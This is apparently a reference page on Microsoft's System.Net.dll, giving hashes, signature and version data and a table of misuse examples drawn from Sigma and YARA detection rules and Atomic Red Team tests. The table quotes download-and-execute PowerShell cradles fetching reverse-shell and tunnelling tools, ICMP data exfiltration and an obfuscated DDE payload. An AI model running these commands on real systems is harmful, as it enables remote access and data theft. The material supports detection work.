---
title: System.Net.dll | System.Net.dll
excerpt: What is System.Net.dll?
---

# System.Net.dll 

* File Path: `C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\v4.8\System.Net.dll`
* Description: System.Net.dll
* Comments: System.Net.dll


## Hashes

Type | Hash
-- | --
MD5 | `C99604A6A5C5ED5D8DBED15335EB5152`
SHA1 | `357C9BC3F5C01C9D8BABCB17651D54E2D0ED0A1F`
SHA256 | `43F0DC90E769D747FCBB40F621B3BB3E16C3E03289CE30371D939E3853CC32AB`
SHA384 | `71FB676262ADC02BFA6F56712AFA4F16BF2217AA3535B5D4AF4B8395E3CB57A69013AD572A126CC2AA19F4F6B8ED0EED`
SHA512 | `50103B279E91341B66E351DBFA28803887B920CB782854A37DCA04F4BA4548AF133D2075AFBCF3F4FA532BED35C19C7C088F2FE52EA1480497767F7022C3702C`
SSDEEP | `768:xVRf4N350gQ0mbg1vUOBHAD0ON7JqHbrEotyITLe848GeCTfqWaAmg8Db:zd4H0gQ0mbg1v1qz7JqHjy7TeCFaAY`
IMP | `DAE02F32A21E03CE65412F6E56942DAA`
PESHA1 | `E9238BEA3CF3FE5AA9226C52A6345710415315C6`
PE256 | `0495455D3C41F4F1360ABC96C6C7DF056F458B0B32C45DA8FFF76BBB601DA02A`


## Signature

* Status: Signature verified.
* Serial: `33000001519E8D8F4071A30E41000000000151`
* Thumbprint: `62009AAABDAE749FD47D19150958329BF6FF4B34`
* Issuer: CN=Microsoft Code Signing PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Corporation, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: System.Net.dll
* Product Name: Microsoft .NET Framework
* Company Name: Microsoft Corporation
* File Version: 4.8.4084.0
* Product Version: 4.8.4084.0
* Language: Language Neutral
* Legal Copyright:  Microsoft Corporation.  All rights reserved.
* Machine Type: 32-bit

## File Scan

* VirusTotal Detections: 0/76
* VirusTotal Link: https://www.virustotal.com/gui/file/43f0dc90e769d747fcbb40f621b3bb3e16c3e03289ce30371d939e3853cc32ab/detection


## Possible Misuse

*The following table contains possible examples of `System.Net.dll` being misused. While `System.Net.dll` is **not** inherently malicious, its legitimate functionality can be abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [powershell_suspicious_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_suspicious_download.yml) | `- 'System.Net.WebClient'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [powershell_suspicious_invocation_specific.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/powershell/powershell_suspicious_invocation_specific.yml) | `- '*bypass -noprofile -windowstyle hidden (new-object system.net.webclient).download*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powershell_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_download.yml) | `- '*new-object system.net.webclient).downloadstring(*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_powershell_download.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_powershell_download.yml) | `- '*new-object system.net.webclient).downloadfile(*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_ps_downloadfile.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_ps_downloadfile.yml) | `- 'System.Net.WebClient'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_wmi_susp_scripting.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_wmi_susp_scripting.yml) | `- '*new-object system.net.webclient).downloadstring(*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [sysmon_wmi_susp_scripting.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_wmi_susp_scripting.yml) | `- '*new-object system.net.webclient).downloadfile(*'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1016.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1016/T1016.md) | $test = new-object system.Net.Sockets.TcpClient | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1048.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1048.003/T1048.003.md) | $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) } | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1071.004.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1071.004/T1071.004.md) | IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1') | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1095.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md) | IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1') | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1095.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1095/T1095.md) | IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1') | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1105.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.md) | (New-Object System.Net.WebClient).DownloadFile("#{remote_file}", "#{destination_path}") | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.001/T1110.001.md) | $credz = new-object System.Net.NetworkCredential("#{user}", $password, "#{domain}") | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1110.003.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1110.003/T1110.003.md) | $credz = new-object System.Net.NetworkCredential($user, $password, "#{domain}") | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1559.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1559.002/T1559.002.md) | 10. DDEAUTO "C:\\Programs\\Microsoft\\Office\\MSWord\\..\\..\\..\\..\\windows\\system32\\{ QUOTE 87 105 110 100 111 119 115 80 111 119 101 114 83 104 101 108 108 }\\v1.0\\{ QUOTE 112 111 119 101 114 115 104 101 108 108 46 101 120 101 } -w 1 -nop { QUOTE 105 101 120 }(New-Object System.Net.WebClient).DownloadString('http://<server>/download.ps1'); # " "Microsoft Document Security Add-On" | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1562.002.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.002/T1562.002.md) | $wc = New-Object System.Net.WebClient | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1566.001.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1566.001/T1566.001.md) | $wc = New-Object System.Net.WebClient | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[atomic-red-team](https://github.com/redcanaryco/atomic-red-team) | [T1573.md](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1573/T1573.md) | $sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback])) | [MIT License. © 2018 Red Canary](https://github.com/redcanaryco/atomic-red-team/blob/master/LICENSE.txt)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_aus_parl_compromise.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_aus_parl_compromise.yar) | $s1 = "wProxy.Credentials = new System.Net.NetworkCredential(pusr, ppwd);" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $x1 = "DownloadExecute=\"powershell \"\"&{$r=Get-Random;$wc=(new-object System.Net.WebClient);$wc.DownloadFile(" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $x1 = "= \"http://\" + [System.Net.Dns]::GetHostAddresses(\"" ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [apt_oilrig.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/apt_oilrig.yar) | $s1 = "= new-object System.Net.WebProxy($u, $true);" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_cn_webshells.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_cn_webshells.yar) | $s2 = "host = System.Net.Dns.Resolve(\"127.0.0.1\");" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_invoke_thehash.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_invoke_thehash.yar) | $s3 = "$target_address_list = [System.Net.Dns]::GetHostEntry($target_long).AddressList" fullword ascii | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $s1 = "System.Net.WebClient).DownloadString(\"http" ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [gen_powershell_susp.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/gen_powershell_susp.yar) | $s2 = "System.Net.WebClient).DownloadString('http" ascii nocase | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)
[signature-base](https://github.com/Neo23x0/signature-base) | [thor-hacktools.yar](https://github.com/Neo23x0/signature-base/blob/master/yara/thor-hacktools.yar) | $s1 = "$Client = New-Object -TypeName System.Net.Sockets.TcpClient" fullword | [CC BY-NC 4.0](https://github.com/Neo23x0/signature-base/blob/master/LICENSE)



MIT License. Copyright (c) 2020 Strontic.


